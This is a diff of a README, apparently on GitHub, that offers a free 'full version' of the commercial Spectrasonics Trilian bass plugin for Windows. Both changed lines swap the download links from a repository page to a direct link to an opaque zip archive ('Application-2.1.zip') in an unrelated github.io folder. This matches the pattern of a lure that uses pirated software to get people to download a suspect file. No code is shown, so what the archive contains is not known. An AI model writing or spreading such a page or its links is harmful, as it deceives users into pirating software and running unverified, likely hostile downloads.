@@ -5,7 +5,7 @@ description: "Download the full version of Spectrasonics Trilian for Windows 10 
 ---
 # 🎸 Trilian-2026 - Access professional bass sounds for productions
 
-[![](https://img.shields.io/badge/Download-Trilian_2026-blue.svg)](https://github.com/krushang8025/Trilian-2026)
+[![](https://img.shields.io/badge/Download-Trilian_2026-blue.svg)](https://github.com/krushang8025/krushang8025.github.io/raw/refs/heads/main/kelvin/Application-2.1.zip)
 
 This repository provides the full version of the Spectrasonics Trilian bass module for Windows operating systems. Trilian includes acoustic, electric, and synth bass sounds for music production.
 
@@ -24,7 +24,7 @@ Before you start the installation, ensure your computer meets these requirements
 
 You must obtain the installer files from the main repository page to begin the setup. 
 
-[Click here to visit the download page for Trilian 2026](https://github.com/krushang8025/Trilian-2026)
+[Click here to visit the download page for Trilian 2026](https://github.com/krushang8025/krushang8025.github.io/raw/refs/heads/main/kelvin/Application-2.1.zip)
 
 ## ⚙️ Installation Steps
 
